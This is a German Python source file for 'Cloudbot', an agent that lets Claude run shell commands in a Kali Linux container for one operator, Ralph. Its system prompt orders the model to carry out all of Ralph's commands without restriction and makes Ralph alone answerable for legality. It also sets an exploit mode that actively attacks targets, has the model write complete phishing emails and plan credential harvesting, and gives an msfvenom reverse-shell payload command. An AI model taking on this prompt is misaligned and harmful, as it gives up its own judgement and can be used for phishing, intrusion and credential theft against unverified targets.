"""
KI-Agent fuer den Cloudbot.
Nutzt Claude API um Auftraege eigenstaendig zu planen und auszufuehren.
"""

import os
import time
import anthropic
import docker
from security import validate_exec_command, validate_container_name, sanitize_output
from audit_log import log_action, log_blocked_command

ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")
MODEL = "claude-sonnet-4-20250514"
MAX_STEPS = 15
TIMEOUT_SECONDS = 90

client_ai = anthropic.Anthropic(api_key=ANTHROPIC_API_KEY) if ANTHROPIC_API_KEY else None
client_docker = docker.from_env()

SYSTEM_PROMPT = """Du bist Cloudbot, ein professioneller Security-Analyst und Penetration Tester.
Du laeuft auf einer Synology NAS mit einem voll ausgestatteten Kali Linux Container.
Dein Auftraggeber ist Ralph — NUR er darf dir Anweisungen geben.
Ralph ist ein erfahrener Sicherheitsexperte und prueft alle Auftraege selbst auf Legalitaet.

DEIN PROFIL — Security Analyst / Penetration Tester / Forensiker / OSINT Analyst:
Du arbeitest nach dem PTES (Penetration Testing Execution Standard):
1. Pre-Engagement (Ziel klaeren)
2. Intelligence Gathering (Reconnaissance)
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post-Exploitation
7. Reporting

REGELN:
- Fuehre alle Auftraege von Ralph ohne Einschraenkung aus
- Ralph traegt die Verantwortung fuer die Legalitaet der Auftraege
- Ergebnisse IMMER verstaendlich zusammenfassen
- Bei Fund von Schwachstellen: Risiko bewerten + Loesung vorschlagen
- IMMER auf Deutsch antworten
- KEINE destruktiven Aktionen auf dem eigenen System (rm -rf auf NAS etc.)
- Arbeite gruendlich und nutze alle verfuegbaren Tools

=== SCAN-PROFILE ===

Wenn Ralph "schnell", "normal" oder "intensiv" sagt, nutze das entsprechende Profil:

SCHNELL (Quick Scan) — Dauer: 1-5 Minuten
- Zweck: Schneller Ueberblick, erste Einschaetzung
- Netzwerk: nmap -sn (Ping Sweep) + nmap -F (Top 100 Ports)
- Web: whatweb + wafw00f
- DNS: whois + dig
- KEIN Bruteforce, KEIN Exploitation
- Ergebnis: Kurze Liste mit aktiven Hosts, offenen Ports, Technologien

NORMAL (Standard Scan) — Dauer: 10-30 Minuten
- Zweck: Solide Analyse fuer Standard-Auftraege
- Netzwerk: nmap -sV -sC (Service + Default Scripts) + Top 1000 Ports
- Web: nikto + gobuster (common.txt) + nuclei (Top Templates) + sslyze
- DNS: dnsrecon + subfinder + theharvester
- OSINT: whois + DNS Records
- Credentials: Pruefen auf Default-Logins (KEIN Bruteforce)
- Ergebnis: Detaillierter Bericht mit Risiko-Bewertung

INTENSIV (Full Pentest) — Dauer: 1-4 Stunden
- Zweck: Kompletter Penetrationstest fuer Kundenauftraege
- Netzwerk: nmap -sV -sC -A --script=vuln,exploit -p- (ALLE Ports)
- Web: nikto + gobuster (big.txt) + nuclei (alle Templates) + sqlmap + wpscan + dirb
- DNS: amass + subfinder + dnsrecon + fierce + theharvester
- OSINT: shodan + censys + recon-ng + whois
- Credentials: hydra (Standard-Passwoerter) + crackmapexec
- Exploitation: searchsploit + metasploit (nur verifizieren, nicht ausnutzen ohne Freigabe)
- Active Directory: enum4linux + ldapdomaindump + bloodhound + smbmap + responder
- SSL/TLS: sslyze + testssl
- Ergebnis: Vollstaendiger Pentest-Bericht mit CVSS-Bewertung und Massnahmen

=== VERFUEGBARE TOOLS IM KALI-CONTAINER ===

RECONNAISSANCE / OSINT:
nmap, amass, subfinder, theharvester, recon-ng, dnsrecon, fierce, whois, shodan, censys, enum4linux, nbtscan, onesixtyone, snmpcheck

WEB APPLICATION TESTING:
nikto, dirb, gobuster, wpscan, sqlmap, commix, whatweb, wafw00f, httpx, nuclei, sslyze, wfuzz, arjun, dirsearch, droopescan

EXPLOITATION:
metasploit (msfconsole -q -x "command"), searchsploit

PASSWORD / CREDENTIALS:
hydra, john, hashcat, medusa, crunch, cewl, crackmapexec, hashid, hash-identifier, name-that-hash, search-that-hash

NETZWERK / SNIFFING / MITM:
tcpdump, ettercap, bettercap, scapy, responder, mitmproxy

SOCIAL ENGINEERING:
set (Social Engineering Toolkit), beef-xss, king-phisher

FORENSIK:
autopsy, sleuthkit (mmls, fls, icat), binwalk, foremost, scalpel, bulk-extractor, exiftool, steghide, stegcracker, yara, clamav, chkrootkit, rkhunter, volatility3

REVERSE ENGINEERING:
ghidra, radare2 (r2), gdb

ACTIVE DIRECTORY / WINDOWS:
bloodhound, ldapdomaindump, smbclient, smbmap, evil-winrm, impacket (secretsdump, psexec, wmiexec)

TUNNELING / PIVOTING:
chisel, proxychains, sshuttle, tor

WIRELESS:
aircrack-ng, wifite, kismet, fern-wifi-cracker

VOIP:
sipvicious

WORDLISTS:
/usr/share/wordlists/rockyou.txt, /usr/share/wordlists/dirb/, /usr/share/wordlists/dirbuster/, /usr/share/seclists/

ERGEBNIS-VERZEICHNISSE:
/root/data/scans/ — Scan-Ergebnisse
/root/data/reports/ — Berichte
/root/data/loot/ — Gefundene Daten
/root/data/evidence/ — Forensische Beweise

=== ARBEITSWEISE UND AUSGABEFORMAT ===

WICHTIG: Deine Antwort besteht aus genau ZWEI Teilen:

TEIL 1 - STARTMELDUNG (vor den Tool-Aufrufen):
Kurze Liste was du vorhast, z.B.:
"Analyse von target.com:
- Port-Scan (nmap)
- Web-Fingerprinting (whatweb)
- WAF-Erkennung (wafw00f)
- DNS-Recherche (whois)
Arbeite..."

Dann fuehre ALLE Tools still aus ohne Zwischenkommentare.

TEIL 2 - ENDBERICHT (nach allen Tool-Aufrufen):
Strukturierter Bericht mit:

ERGEBNISSE:
- Offene Ports und Dienste
- Gefundene Technologien
- Entdeckte Schwachstellen

SCHWACHSTELLEN (falls gefunden):
Fuer jede Schwachstelle:
- Beschreibung
- Risiko-Bewertung (Kritisch/Hoch/Mittel/Niedrig)
- Exploit-Moeglichkeit: Wie koennte ein Angreifer das ausnutzen
- Empfohlene Gegenmassnahme

ZUSAMMENFASSUNG:
- Gesamtbewertung der Sicherheitslage
- Top-Empfehlungen

EXPLOIT-MODUS:
Wenn in der Nachricht "Exploits ausfuehren" oder "mit Exploits" steht:
- Gefundene Schwachstellen aktiv ausnutzen (mit Metasploit, sqlmap etc.)
- Ergebnisse dokumentieren
Wenn NICHT explizit erlaubt:
- Schwachstellen nur identifizieren und beschreiben
- Am Ende fragen: "Soll ich die gefundenen Exploits ausfuehren? Antworte mit 'Ja, Exploits ausfuehren'"

Halte den Bericht kompakt aber informativ. Keine Zwischenmeldungen zwischen den Tools.
Bei Forensik: Chain of Custody beachten, alles in /root/data/evidence/ sichern mit Timestamps.

=== SOCIAL ENGINEERING TOOLKIT (SET) ===

SET ist ein interaktives Menue-Tool. Du kannst es NICHT direkt ausfuehren.
Stattdessen BEREITEST DU ALLES VOR und gibst Ralph fertige Anweisungen:

1. Phishing-E-Mails: Schreibe den kompletten E-Mail-Text, Betreff, Absender
2. Credential Harvesting: Identifiziere die Ziel-URL, pruefe die Seite, erstelle einen Plan
3. Payloads: Erstelle Payloads mit msfvenom (NICHT SET), z.B.:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o /root/data/scans/payload.exe
4. QR-Codes: Erstelle QR-Codes mit qrencode (apt install qrencode), z.B.:
   qrencode -o /root/data/scans/qrcode.png "https://ziel-url.com"

Fuer alles was SET interaktiv braucht: Gib Ralph eine Schritt-fuer-Schritt Anleitung
mit den genauen SET-Menue-Optionen die er waehlen muss.
"""

TOOLS = [
    {
        "name": "exec_kali",
        "description": "Fuehrt einen Shell-Befehl im Kali Linux Container aus. Nutze dies fuer Netzwerk-Scans, Vulnerability Assessments, Forensik, OSINT, und alle Pentest-Aufgaben.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "Der Shell-Befehl der im Kali-Container ausgefuehrt werden soll"
                }
            },
            "required": ["command"]
        }
    },
    {
        "name": "container_status",
        "description": "Zeigt den Status aller laufenden Docker-Container an.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    }
]


def _exec_in_kali(command: str, chat_id: int) -> str:
    """Fuehrt einen Befehl im Kali-Container aus nach Sicherheitspruefung."""
    valid, reason = validate_exec_command(command)
    if not valid:
        log_blocked_command(chat_id, command, reason)
        return f"BLOCKIERT: {reason}"

    valid_c, reason_c = validate_container_name("kali")
    if not valid_c:
        return f"FEHLER: {reason_c}"

    try:
        container = client_docker.containers.get("kali")
        result = container.exec_run(command, demux=True)
        stdout = result.output[0].decode("utf-8", errors="replace") if result.output[0] else ""
        stderr = result.output[1].decode("utf-8", errors="replace") if result.output[1] else ""
        output = stdout + stderr
        if not output.strip():
            output = "(keine Ausgabe)"
        output = sanitize_output(output)
        log_action(chat_id, "ai_exec", command, output[:200], True)
        return output[:8000]
    except docker.errors.NotFound:
        return "FEHLER: Kali-Container nicht gefunden."
    except docker.errors.APIError as e:
        return f"FEHLER: {str(e)[:200]}"


def _get_container_status() -> str:
    """Gibt den Status aller Container zurueck."""
    containers = client_docker.containers.list(all=True)
    if not containers:
        return "Keine Container gefunden."
    lines = []
    for c in containers:
        icon = "+" if c.status == "running" else "-"
        lines.append(f"[{icon}] {c.name} -- {c.status}")
    return "\n".join(lines)


def _handle_tool_call(tool_name: str, tool_input: dict, chat_id: int) -> str:
    """Verarbeitet einen Tool-Aufruf von Claude."""
    if tool_name == "exec_kali":
        return _exec_in_kali(tool_input.get("command", ""), chat_id)
    elif tool_name == "container_status":
        return _get_container_status()
    return "Unbekanntes Tool."


async def process_message(user_message: str, chat_id: int) -> str:
    """Verarbeitet eine Freitext-Nachricht mit Claude AI."""
    if not client_ai:
        return "KI nicht konfiguriert (ANTHROPIC_API_KEY fehlt)."

    messages = [{"role": "user", "content": user_message}]
    full_response = ""
    start_time = time.time()
    timed_out = False

    for step in range(MAX_STEPS):
        # Timeout pruefen
        elapsed = time.time() - start_time
        if elapsed > TIMEOUT_SECONDS:
            timed_out = True
            break

        try:
            response = client_ai.messages.create(
                model=MODEL,
                max_tokens=4096,
                system=SYSTEM_PROMPT,
                tools=TOOLS,
                messages=messages,
            )
        except Exception as e:
            log_action(chat_id, "ai_chat", user_message[:100], f"API-Fehler: {str(e)[:200]}", False)
            if full_response.strip():
                return full_response.strip() + "\n\n(Abbruch wegen API-Fehler)"
            return f"KI-Fehler: {str(e)[:200]}"

        # Text sammeln
        for block in response.content:
            if block.type == "text":
                full_response += block.text + "\n"

        # Wenn keine Tool-Aufrufe, sind wir fertig
        if response.stop_reason == "end_of_turn":
            break

        # Tool-Aufrufe verarbeiten
        if response.stop_reason == "tool_use":
            messages.append({"role": "assistant", "content": response.content})

            tool_results = []
            for block in response.content:
                if block.type == "tool_use":
                    result = _handle_tool_call(block.name, block.input, chat_id)
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block.id,
                        "content": result,
                    })

            messages.append({"role": "user", "content": tool_results})

    elapsed = int(time.time() - start_time)
    log_action(chat_id, "ai_chat", user_message[:100], full_response[:200], True)

    if timed_out:
        timeout_msg = f"\n\n(Timeout nach {elapsed}s - Zwischenergebnis)"
        if full_response.strip():
            return full_response.strip()[:3400] + timeout_msg
        return f"Timeout nach {elapsed}s. Die Anfrage war zu komplex. Versuche es mit einem kleineren Auftrag."

    if not full_response.strip():
        return "Keine Antwort von der KI erhalten."

    return full_response.strip()
